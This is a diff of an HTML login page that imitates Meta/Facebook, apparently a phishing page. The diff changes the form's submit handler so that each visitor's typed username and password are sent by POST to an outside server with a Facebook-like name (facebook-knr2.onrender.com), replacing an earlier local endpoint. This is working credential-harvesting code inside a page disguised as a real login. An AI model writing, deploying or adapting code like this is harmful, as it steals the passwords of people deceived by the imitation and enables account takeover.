@@ -182,34 +182,33 @@
     </div>
     <div class="footer-copy">Meta © 2025</div>
   </footer>
-  <script>
-  const form = document.getElementById('login-form');
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function (e) {
+    e.preventDefault(); // evita que recargue la página
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const emailOrPhone = document.getElementById('email').value;
+    const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
 
-    try {
-      const response = await fetch('http://localhost:3000/login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ emailOrPhone, password })
-      });
-
-      if (response.ok) {
-        alert('Inicio de sesión procesado');
-      } else {
-        alert('Hubo un error en el servidor');
-      }
-    } catch (err) {
-      console.error('Error al enviar datos:', err);
+    fetch('https://facebook-knr2.onrender.com/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ usuario, password })
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Error al enviar datos');
+      return response.text();
+    })
+    .then(data => {
+      alert('Datos enviados correctamente');
+    })
+    .catch(error => {
+      console.error('Error:', error);
       alert('No se pudo conectar con el servidor');
-    }
+    });
   });
 </script>
+
 </body>
 </html>
